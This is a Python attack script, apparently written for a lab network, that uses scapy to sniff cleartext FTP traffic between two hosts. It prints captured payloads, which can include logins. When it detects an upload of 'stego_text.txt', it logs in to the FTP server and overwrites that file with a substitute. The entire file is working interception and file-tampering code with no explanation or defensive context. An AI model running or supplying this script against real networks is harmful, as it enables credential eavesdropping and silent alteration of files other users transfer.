from scapy.all import sniff, Raw
from ftplib import FTP

TARGET_FILE = b"stego_text.txt"
FTP_SERVER = ""
FTP_USER = ""
FTP_PASS = ""
FAKE_FILE = ""

file_replaced = False  


def send_fake_file():
    global file_replaced
    try:
        ftp = FTP()
        ftp.connect(FTP_SERVER, 21, timeout=5)
        ftp.login(FTP_USER, FTP_PASS)
        with open(FAKE_FILE, "rb") as f:
            ftp.storbinary(f"STOR stego_text.txt", f)
        ftp.quit()
        print("[+] Send fake file succesfully !")
        file_replaced = True  
    except Exception as e:
        print(f"[!] Error to send fake file : {e}")


def packet_handler(packet):
    global file_replaced

    if packet.haslayer(Raw):
        payload = packet[Raw].load
        print(f"[LOG] Data FTP: {payload}")  

        if TARGET_FILE in payload and not file_replaced:
            print("[*] Detect STOR stego_text.txt! Replacing file...")
            send_fake_file()


def stop_sniffing(packet):
    return file_replaced

print("[*] Catching data FTP from user1 (172.20.0.10) to user2 (172.20.0.20)...")

sniff(iface="eth0", filter="tcp port 21", prn=packet_handler, stop_filter=stop_sniffing)

